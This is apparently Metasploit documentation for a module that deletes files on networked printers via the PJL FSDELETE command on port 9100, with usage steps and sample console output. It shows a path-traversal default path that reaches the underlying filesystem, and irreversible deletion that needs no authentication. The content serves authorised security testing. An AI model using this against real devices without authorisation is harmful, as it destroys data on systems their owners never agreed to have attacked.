## Vulnerable Application

This module targets networked printers that expose the Printer Job Language (PJL) interface on TCP port 9100 (HP JetDirect / AppSocket). It uses the PJL `FSDELETE` command to remove a file from the printer's filesystem.

The default path (`0:\..\..\..\eicar.com`) corresponds to a file that would have been placed by the companion `printer_upload_file` module during testing. The path traversal notation (`\..\`) can, on vulnerable devices, reach outside the printer's own volume into the underlying OS filesystem. Deletion is irreversible; use this module against test targets or to clean up files written during authorised assessments.

The PRET project ([https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)) documented PJL filesystem deletion; this module is built on the Rex::Proto::PJL library, which draws from that research.

No authentication is required by default on most PJL implementations.

## Verification Steps

1. Start `msfconsole`
2. Do: `use auxiliary/scanner/printer/printer_delete_file`
3. Do: `set RHOSTS [target IP or range]`
4. Do: `set PATH [PJL path to the file to delete]`
5. Do: `run`
6. A successful deletion prints a confirmation including the deleted path.

## Options

### RHOSTS

The target host(s) or range to scan. Accepts individual IPs, CIDR notation, or a file path prefixed with `file:`. Required.

### RPORT

The TCP port on which the printer's PJL/JetDirect interface is listening. (Default: `9100`)

### PATH

The PJL filesystem path of the file to delete. Uses PJL volume-relative syntax; `\..\` traverses to parent directories. (Default: `0:\..\..\..\eicar.com`, Required)

### THREADS

Number of concurrent scan threads. (Default: `1`)

## Scenarios

### Deleting the EICAR test file written during a prior upload test

Example output (synthesized for documentation purposes; actual values will vary by device):

```
msf6 > use auxiliary/scanner/printer/printer_delete_file
msf6 auxiliary(scanner/printer/printer_delete_file) > set RHOSTS 192.168.1.45
RHOSTS => 192.168.1.45
msf6 auxiliary(scanner/printer/printer_delete_file) > run

[+] 192.168.1.45:9100 - Deleted 0:\..\..\..\eicar.com
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Deleting a file on the printer's own storage volume

```
msf6 auxiliary(scanner/printer/printer_delete_file) > set PATH 0:\JOBS\oldprint.prn
PATH => 0:\JOBS\oldprint.prn
msf6 auxiliary(scanner/printer/printer_delete_file) > run

[+] 192.168.1.45:9100 - Deleted 0:\JOBS\oldprint.prn
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
